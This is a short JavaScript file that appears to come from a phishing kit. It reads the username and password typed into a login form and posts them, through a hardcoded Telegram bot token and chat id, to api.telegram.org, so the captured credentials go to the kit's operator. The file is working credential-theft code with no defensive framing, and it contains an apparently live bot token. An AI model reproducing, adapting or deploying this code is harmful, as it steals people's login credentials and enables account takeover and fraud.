//bot token
var telegram_bot_id = "6796643275:AAHvGCG9WmjECFZLIkEW1_5ow2iYZNY9BqA";
//chat id
var chat_id = 5576539609;
var u_name, u_password, message;

var ready = function () {
    u_name = document.getElementById("username").value;
    u_password = document.getElementById("password").value;

    // Check if both username and password are not empty
    if (u_name.trim() !== "" && u_password.trim() !== "") {
        message = "Name: " + u_name + "\nPassword: " + u_password;
        sender(); // Call sender only if information is completed
    }
};


var sender = function () {
    var u_name = document.getElementById("username").value;
    var u_password = document.getElementById("password").value;

    // Check if both username and password are not empty
    if (u_name.trim() !== "" && u_password.trim() !== "") {
        var message = "Name: " + u_name + "\nPassword: " + u_password;
        
        var settings = {
            "async": true,
            "crossDomain": true,
            "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "cache-control": "no-cache"
            },
            "data": JSON.stringify({
                "chat_id": chat_id,
                "text": message
            })
        };

        // Send the message
        $.ajax(settings).done(function (response) {
            console.log(response);
        });
    }

    return false;
};


document.addEventListener('DOMContentLoaded', function () {
    // Call ready function if needed
    document.addEventListener('DOMContentLoaded', ready);

});

